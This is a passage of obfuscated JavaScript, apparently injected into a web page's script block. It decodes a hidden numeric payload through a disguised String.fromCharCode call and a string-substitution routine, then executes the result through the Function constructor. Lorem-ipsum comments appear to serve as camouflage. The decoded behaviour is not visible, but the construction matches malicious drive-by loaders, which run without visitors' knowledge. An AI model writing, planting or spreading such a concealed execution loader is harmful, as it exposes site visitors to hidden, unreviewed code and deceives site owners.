86,71,16,82,84,81,86,81,86,91,82,71,16,5,2,14,85,71,86,54,75,79,71,81,87,86,10,2,28,2,15,56,74,10,5,81,16,76,51,87,71,84,91,11,95,2,17,29,75,72,10,2,18,9,11,11,2,19,54,92,71,54,87,4,11,13,56,85,2,20,91,51,42,54,82,89,71,71,71,82,51,2,21,11,93,62,2,2,22,11,29,5,2,23,6,16,73,71,86,44,53,49,48,10,5,2,24,16,76,81,75,80,10,2,25,31,96,92,9,11,13,2,26,5,70,31,5,80,61,5,79,13,56,2,27,95,34,2,5,2,28,34,10,11,93,2,29,13,10,13,96,71,2,18,29,56];}
	
	function co() {
		return 'Code';
	}
	function gafu() {
		xxx=a(String, 'f' + ro() + co());
		return function(q){return xxx(q);};
	};
	rex = [gafu(),gafu()];
	

	function choo(k) {
		if (k < 9) {
			return 1
		} else {
			return 2
		}
	};
	
	d = '';
	mapper = [5,34,56,58,66,96,62,2,2,2,3,2,6,2,7,2,8,2,10,2,11,2,12,2,13,2,14,2,15,2,17,2,18,2,19,2,20,2,21,2,22,2,23,2,24,2,25,2,26,2,27,2,28,2,29];
	map = '';

	function fs(ro, arr, add, st, en,dp) {
		//Mauris gravida, libero ut tempor ultricies, ante erat blandit dui, vestibulum convallis ligula lacus et metus. Duis quis nunc justo, gravida sem
		var hf = ((en+st)>>1);
		if(en-st>16)
		{
			//lacus, tristique vitae aliquet a, ultrices nec libero. Aliquam sagittis enim in nibh semper tincidunt. Donec malesuada lorem sit amet risus euis
			return fs(ro, arr, add, st, hf,dp+1) + fs(ro,arr, add, hf, en,dp+1);
		}else{
			var rt='';rx1=rex[add-29];
			for(var rj=st;rj<en;rj++){
			rt+=rx1(arr[rj]+add);
		}
		//modo, diam a placerat facilisis, magna libero mollis erat, in molestie nunc tellus consequat justo. Nulla ac nunc purus. Pellentesque habitant morbi
			return rt;
		}
	}
	map += fs(map, mapper, 30, 0,mapper.length);
	//et condimentum metus. Aliquam convallis auctor sapien, sit amet bibendum ligula condimentum ac. Vivamus blandit molestie enim vitae bland

	function a(b, c) {
		return b[c];
	};

	function ro() {
		return 'romChar';
	}
	rd=fs(d, qq2(), 30, 0, qq2().length);
	//e feugiat. Etiam elit elit, hendrerit et varius non, molestie consectetur ipsum. Nullam sapien sem, mattis nec tempus non, elementum vitae ligula. Maur
	$$(_1(map,rd,choo,_2));
})(function(jsBb) {
	return (function(jsB, jsBs) {
		return jsBs(jsB(jsBs(jsB(jsBb))))(jsBb)()
	})((function(jsB) {
		return jsB.constructor
	}), (function(jsB) {
		return (function(jsBs) {
			//accumsan dapibus diam 
			return jsB.call(jsB, jsBs)
		})
	}))
},function(tt){return tt.pop();},
function(kk,dd,ch,pp){
	for(var c=kk.length;c>0;){		
		var x=ch(c);
		c-=x;
		var rep=kk.substr(c, x);
		//accumsan dapibus diam 
		var t = dd.split(rep);
		dd=t.join(pp(t));
	};return dd;
});
/**/
gloa();
</script>